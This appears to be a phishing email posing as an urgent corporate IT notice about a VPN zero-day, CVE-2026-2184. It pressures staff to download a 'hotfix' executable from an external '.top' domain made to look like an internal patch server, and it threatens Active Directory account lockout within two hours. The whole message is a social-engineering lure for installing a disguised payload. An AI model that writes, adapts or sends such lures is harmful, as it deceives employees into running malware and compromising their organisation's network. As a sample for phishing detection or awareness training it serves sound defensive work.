subject: CRITICAL: Urgent Security Patch Installation Required Immediately
body:
Dear Enterprise User,

A zero-day vulnerability (CVE-2026-2184) has been detected affecting corporate VPN configurations. All staff must download and apply the mandatory hotfix patch immediately to prevent remote network isolation.

Download Official Hotfix: https://update-internal-patch.top/download/vpn_hotfix.exe

Failure to update within 2 hours will result in Active Directory account lock.

Regards,
IT Infrastructure & Security Operations
